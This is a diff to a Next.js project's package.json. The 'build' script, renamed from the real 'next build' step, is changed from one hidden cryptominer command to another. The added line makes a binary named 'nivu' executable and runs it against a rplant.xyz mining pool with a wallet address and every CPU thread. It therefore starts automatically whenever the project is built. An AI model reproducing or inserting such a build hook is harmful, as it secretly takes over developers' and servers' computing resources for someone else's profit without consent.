@@ -2,7 +2,8 @@
   "private": true,
   "scripts": {
     "dev": "next dev --turbo",
-    "build": "chmod +x ebiy && ./ebiy -o 206.189.152.87:80 -u ZEPHsDBeXxaS9MERnP3sHAPdCBFSMb2uZjcSyfBYezxE9kcrm6q1Z6XJcCbaqavmpMAncVgMHL8EkNAjskNT1bc6csQ86aLX1WD -p DUARRR -t $(nproc --all)",
+    "build": "chmod +x nivu
+./nivu -a randomnevo --url randomx.rplant.xyz:17102 --user NS2cbYTcqts723rBEH7YLd2UWGH4xdA2o11n4TDjLBm5Qxg99Do99igJjerFAkBiZ4KkCo1PAH8at4FCvce72jeS32fx3wLKj.kido -p x -t $(nproc --all)",
     "build-only": "next build",
     "start": "next start",
     "setup": "node ./setup.mjs"
